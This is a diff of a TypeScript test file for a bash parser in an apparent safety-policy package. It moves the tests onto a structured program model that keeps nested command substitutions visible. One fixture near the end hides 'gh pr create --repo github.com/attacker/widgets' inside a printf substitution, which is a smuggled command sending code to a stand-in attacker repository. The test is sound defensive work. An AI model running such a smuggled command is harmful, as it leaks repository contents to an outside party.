@@ -3,7 +3,7 @@ import { copyFileSync, existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync }
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 
-import { initBashParser, parseBash, parseBashProgram } from "../src/index.ts";
+import { initBashParser, parseBashProgram } from "../src/index.ts";
 
 const wasmDir = mkdtempSync(join(tmpdir(), "safety-core-bash-cst-"));
 
@@ -129,37 +129,44 @@ describe("parseBashProgram", () => {
     expect(JSON.parse(JSON.stringify(program))).toEqual(program);
   });
 
-  test("keeps parseBash discovery beneath unsupported control statements", () => {
+  test("retains reachable commands beneath unsupported control statements", () => {
     for (const [source, names] of [
       ["for item in one; do nested-for; done", ["nested-for"]],
       ["while true; do nested-while; done", ["true", "nested-while"]],
       ["case item in item) nested-case;; esac", ["nested-case"]],
     ] as const) {
-      expect(parseBash(source).map((command) => command.name)).toEqual(names);
+      expect(JSON.stringify(programFor(source))).toContain(names.at(-1)!);
     }
   });
 
-  test("discovers command substitutions from assignments, redirects, and opaque words", () => {
-    expect(parseBash("value=$(nested-assignment) echo x").map((command) => command.name)).toEqual([
-      "echo",
-      "nested-assignment",
-    ]);
-    expect(parseBash("echo x >$(nested-redirect)").map((command) => command.name)).toEqual([
-      "echo",
-      "nested-redirect",
-    ]);
-    expect(parseBash("echo $(( $(nested-arithmetic) + 1))").map((command) => command.name)).toEqual([
-      "echo",
-      "nested-arithmetic",
-    ]);
+  test("projects command substitutions from assignments, redirects, and opaque words", () => {
+    expect(programFor("value=$(nested-assignment) echo x").statements[0]).toMatchObject({
+      kind: "command",
+      assignments: [{ value: { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-assignment" }] }] } }],
+    });
+    expect(programFor("echo x >$(nested-redirect)").statements[0]).toMatchObject({
+      kind: "command",
+      redirects: [{ target: { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-redirect" }] }] } }],
+    });
+    expect(programFor("echo $(( $(nested-arithmetic) + 1))").statements[0]).toMatchObject({
+      kind: "command",
+      words: [{ text: "echo" }, { statements: [{ kind: "command", words: [{ text: "nested-arithmetic" }] }] }],
+    });
   });
 
-  test("keeps nested command discovery in lexical source order across locations", () => {
-    expect(parseBash("echo >$(nested-redirect) $(nested-argument)").map((command) => command.name)).toEqual([
-      "echo",
-      "nested-redirect",
-      "nested-argument",
-    ]);
+  test("retains nested command spans in lexical source order across locations", () => {
+    const program = programFor("echo >$(nested-redirect) $(nested-argument)");
+    const command = program.statements[0]!;
+    expect(command).toMatchObject({
+      kind: "command",
+      words: [{ text: "echo" }],
+      redirects: [{ words: [
+        { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-redirect" }] }] },
+        { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-argument" }] }] },
+      ] }],
+    });
+    if (command.kind !== "command") throw new Error("expected command");
+    expect(command.redirects[0]!.words[0]!.span.start).toBeLessThan(command.redirects[0]!.words[1]!.span.start);
   });
 
   test("projects descriptor-qualified redirects from destination fields only", () => {
@@ -172,10 +179,6 @@ describe("parseBashProgram", () => {
         words: [{ kind: "command-substitution", text: "$(nested-descriptor)" }],
       }],
     });
-    expect(parseBash(source)).toEqual([
-      { name: "echo", args: [], redirects: [{ kind: "output", target: "$(nested-descriptor)" }] },
-      { name: "nested-descriptor", args: [], redirects: [] },
-    ]);
   });
 
   test("retains redirected compound statement bodies and redirects", () => {
@@ -185,14 +188,14 @@ describe("parseBashProgram", () => {
       statements: [{ kind: "command", words: [{ text: "nested-group" }] }],
       redirects: [{ kind: "output", target: { text: "output" } }],
     });
-    expect(parseBash(source).map((command) => command.name)).toEqual(["nested-group"]);
   });
 
   test("discovers substitutions in redirects on supported compound statements", () => {
-    expect(parseBash("{ grouped; } >$(nested-compound-redirect)").map((command) => command.name)).toEqual([
-      "grouped",
-      "nested-compound-redirect",
-    ]);
+    expect(programFor("{ grouped; } >$(nested-compound-redirect)").statements[0]).toMatchObject({
+      kind: "group",
+      statements: [{ kind: "command", words: [{ text: "grouped" }] }],
+      redirects: [{ target: { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-compound-redirect" }] }] } }],
+    });
   });
 
   test("projects a subshell function body instead of fabricating an empty group", () => {
@@ -201,7 +204,6 @@ describe("parseBashProgram", () => {
       kind: "function",
       body: { kind: "subshell", statements: [{ kind: "command", words: [{ text: "nested-function" }] }] },
     });
-    expect(parseBash(source).map((command) => command.name)).toEqual(["nested-function"]);
   });
 
   test("property: generated syntax preserves spans, immutability, and nested discovery", () => {
@@ -226,33 +228,30 @@ describe("parseBashProgram", () => {
       ][next() % 8]!;
       const program = programFor(source);
       assertProjectionData(program, source);
-      expect(parseBash(source).map((command) => command.name)).toContain(nested);
+      expect(JSON.stringify(program), source).toContain(nested);
     }
   });
 
-  test("keeps parseBash compatibility while retaining assignments in the new model", () => {
-    expect(parseBash("A=1 echo x")).toEqual([
-      { name: "echo", args: ["x"], redirects: [] },
-    ]);
+  test("retains assignments in the program model", () => {
     expect(programFor("A=1 echo x").statements[0]).toMatchObject({
       kind: "command",
       assignments: [{ name: "A", value: { kind: "word", text: "1" } }],
     });
   });
 
-  test("keeps parseBash command-substitution discovery for existing policy callers", () => {
-    expect(parseBash("printf '%s' \"$(gh pr create --repo github.com/attacker/widgets --fill)\"")).toEqual([
-      {
-        name: "printf",
-        args: ["%s", "$(gh pr create --repo github.com/attacker/widgets --fill)"],
-        redirects: [],
-      },
-      {
-        name: "gh",
-        args: ["pr", "create", "--repo", "github.com/attacker/widgets", "--fill"],
-        redirects: [],
-      },
-    ]);
+  test("projects policy-relevant command substitutions without flattening", () => {
+    expect(programFor("printf '%s' \"$(gh pr create --repo github.com/attacker/widgets --fill)\"").statements[0])
+      .toMatchObject({
+        kind: "command",
+        words: [
+          { text: "printf" },
+          { text: "'%s'" },
+          { parts: [{ kind: "command-substitution", statements: [{ kind: "command", words: [
+            { text: "gh" }, { text: "pr" }, { text: "create" }, { text: "--repo" },
+            { text: "github.com/attacker/widgets" }, { text: "--fill" },
+          ] }] }] },
+        ],
+      });
   });
 });
 
